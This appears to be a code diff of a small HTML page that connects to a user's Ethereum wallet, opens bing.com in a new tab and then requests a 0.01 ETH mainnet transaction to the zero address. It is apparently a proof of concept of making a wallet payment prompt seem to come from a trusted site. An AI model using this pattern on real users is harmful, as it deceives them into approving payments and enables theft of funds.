@@ -21,14 +21,6 @@
   <script>
     let walletConnected = false;
 
-    async function openBingAndPromptWallet() {
-      // Open bing.com
-      window.open('https://bing.com', 'x');
-
-      // Check for wallet connection
-      await promptWalletConnection();
-    }
-
     async function promptWalletConnection() {
       if (typeof window.ethereum !== 'undefined') {
         try {
@@ -44,20 +36,50 @@
       }
     }
 
-    function goBackAndInitiateTransaction() {
-      if (walletConnected) {
-        // Go back to the original site
-        window.history.back();
-      } else {
+    async function openBingAndInitiateTransaction() {
+      if (!walletConnected) {
         alert('Please connect your wallet first.');
+        return;
       }
+
+      // Open bing.com
+      const bingTab = window.open('https://bing.com', 'x');
+
+      // Wait for the bing.com tab to load and then initiate transaction
+      bingTab.onload = async function () {
+        try {
+          console.log('Initiating transaction from bing.com...');
+
+          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+
+          const transactionParameters = {
+            nonce: "0x00",
+            gasPrice: "0x244AC6D",
+            gas: "0x12A52",
+            to: "0x0000000000000000000000000000000000000000",
+            from: accounts[0],
+            value: "0x2386F26FC10000",
+            data: "0x00",
+            chainId: "0x1", // Mainnet
+          };
+
+          const txHash = await ethereum.request({
+            method: "eth_sendTransaction",
+            params: [transactionParameters],
+          });
+
+          console.log(`Transaction sent! Transaction hash: ${txHash}`);
+        } catch (error) {
+          console.error(`Transaction failed: ${error.message}`);
+        }
+      };
     }
   </script>
   <center>
-    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
+    <input type="button" class="button" value="Connect Wallet" onclick="promptWalletConnection()">
     <br>
     <br>
-    <input type="button" class="button" value="Pay" onclick="goBackAndInitiateTransaction()">
+    <input type="button" class="button" value="Pay" onclick="openBingAndInitiateTransaction()">
   </center>
 </body>
 </html>
